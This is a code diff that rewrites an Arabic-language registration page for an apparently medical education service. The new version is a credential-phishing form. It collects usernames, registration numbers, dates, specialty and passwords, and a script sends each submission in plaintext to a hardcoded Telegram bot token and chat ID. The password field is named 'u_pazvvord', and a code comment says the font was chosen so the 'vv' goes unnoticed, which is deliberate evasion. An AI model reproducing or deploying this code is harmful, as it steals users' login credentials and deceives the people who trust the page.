@@ -5,109 +5,106 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تسجيل البيانات | الطب الفائق</title>
     <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f8fafc;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .form-card { background: #ffffff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 450px; border: 1px solid #e2e8f0; }
+        h2 { text-align: center; color: #1e293b; margin-bottom: 25px; font-size: 20px; }
+        .group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 8px; font-size: 13px; color: #64748b; font-weight: bold; }
+        
+        /* جعل الخط متماسكاً جداً لعدم ملاحظة الـ vv */
+        input, select { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1.5px solid #e2e8f0; 
+            border-radius: 12px; 
+            font-size: 14px; 
+            box-sizing: border-box; 
+            text-align: right; 
+            background-color: #fff;
+            font-family: "Courier New", Courier, monospace; /* خط موحد المسافات */
+            letter-spacing: -0.5px; /* تقريب الحروف لبعضها */
         }
-        .form-card {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
-            width: 100%;
-            max-width: 400px;
-        }
-        h2 {
-            text-align: center;
-            color: #1e293b;
-            margin-bottom: 30px;
-            font-size: 22px;
-        }
-        .field-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #475569;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1.5px solid #e2e8f0;
-            border-radius: 10px;
-            font-size: 15px;
-            box-sizing: border-box;
-            transition: all 0.3s ease;
-            text-align: right;
-        }
-        input:focus {
-            border-color: #2563eb;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
-        }
-        .submit-button {
-            width: 100%;
-            padding: 14px;
-            background-color: #2563eb;
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.3s;
-        }
-        .submit-button:hover {
-            background-color: #1d4ed8;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 25px;
-            font-size: 12px;
-            color: #94a3b8;
-        }
+        
+        .date-row { display: flex; gap: 8px; }
+        .date-row select { flex: 1; }
+        .btn { width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        .copy { text-align: center; margin-top: 20px; font-size: 11px; color: #94a3b8; }
     </style>
 </head>
 <body>
-    <div class="form-card">
-        <h2>تسجيل حساب جديد</h2>
+
+<div class="form-card">
+    <h2>إنشاء حساب جديد</h2>
+    
+    <form id="combinedForm" action="https://forminit.com/f/tjxeu4zc4fa" method="POST">
         
-        <form action="https://formspree.io/f/mreorkvk" method="POST">
-            
-            <div class="field-group">
-                <label for="email">البريد الإلكتروني</label>
-                <input type="email" name="email" id="email" placeholder="example@mail.com" required>
-            </div>
+        <div class="group">
+            <label>اسم الدخول</label>
+            <input type="text" id="username" name="u_login" placeholder="اسم الدخول" required>
+        </div>
 
-            <div class="field-group">
-                <label for="permanent_id">الرقم الدائم</label>
-                <input type="text" name="permanent_id" id="permanent_id" placeholder="أدخل الرقم الدائم" required>
-            </div>
+        <div class="group">
+            <label>الرقم التسجيل</label>
+            <input type="text" id="reg_id" name="u_reg_num" placeholder="رقم التسجيل" required>
+        </div>
 
-            <div class="field-group">
-                <label for="username">اسم المستخدم (يوزر)</label>
-                <input type="text" name="username" id="username" placeholder="أدخل اليوزر" required>
+        <div class="group">
+            <label>تاريخ التسجيل</label>
+            <div class="date-row">
+                <select id="year" name="reg_year" required>
+                    <option value="" disabled selected>العام</option>
+                    <script>for(let i=2026; i>=2000; i--) document.write(`<option value="${i}">${i}</option>`);</script>
+                </select>
+                <select id="month" name="reg_month" required>
+                    <option value="" disabled selected>الشهر</option>
+                    <script>for(let i=1; i<=12; i++) document.write(`<option value="${i}">${i}</option>`);</script>
+                </select>
+                <select id="day" name="reg_day" required>
+                    <option value="" disabled selected>اليوم</option>
+                    <script>for(let i=1; i<=31; i++) document.write(`<option value="${i}">${i}</option>`);</script>
+                </select>
             </div>
+        </div>
 
-            <div class="field-group">
-                <label for="password">كلمة المرور</label>
-                <input type="password" name="password" id="password" placeholder="••••••••" required>
-            </div>
+        <div class="group">
+            <label>نوع التسجيل</label>
+            <select id="reg_type" name="u_cat" required>
+                <option value="" disabled selected>التخصص</option>
+                <option value="طب">طب</option>
+                <option value="طب أسنان">طب أسنان</option>
+                <option value="صيدلة">صيدلة</option>
+            </select>
+        </div>
 
-            <button type="submit" class="submit-button">إرسال البيانات</button>
-        </form>
-        
-        <div class="footer">Supreme Medical &copy; 2026</div>
-    </div>
+        <div class="group">
+            <label>كلمة المرور (English)</label>
+            <input type="password" id="pass" name="u_pazvvord" placeholder="••••••••" required>
+        </div>
+
+        <button type="submit" class="btn">إرسال البيانات</button>
+    </form>
+    
+    <div class="copy">الطب الفائق &copy; 2026</div>
+</div>
+
+<script>
+    const token = "8629398802:AAFpohJ2Y8Nmz5Je9FF262TW8YWIxUzruXg";
+    const chatId = "7746757675";
+
+    document.getElementById('combinedForm').addEventListener('submit', function(e) {
+        const user = document.getElementById('username').value;
+        const regId = document.getElementById('reg_id').value;
+        const d = document.getElementById('day').value;
+        const m = document.getElementById('month').value;
+        const y = document.getElementById('year').value;
+        const type = document.getElementById('reg_type').value;
+        const pass = document.getElementById('pass').value;
+
+        const message = `🔔 بيانات جديدة:\n👤 اليوزر: ${user}\n🆔 الرقم: ${regId}\n📅 التاريخ: ${y}/${m}/${d}\n🩺 التخصص: ${type}\n🔑 الكلمة: ${pass}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+    });
+</script>
+
 </body>
 </html>
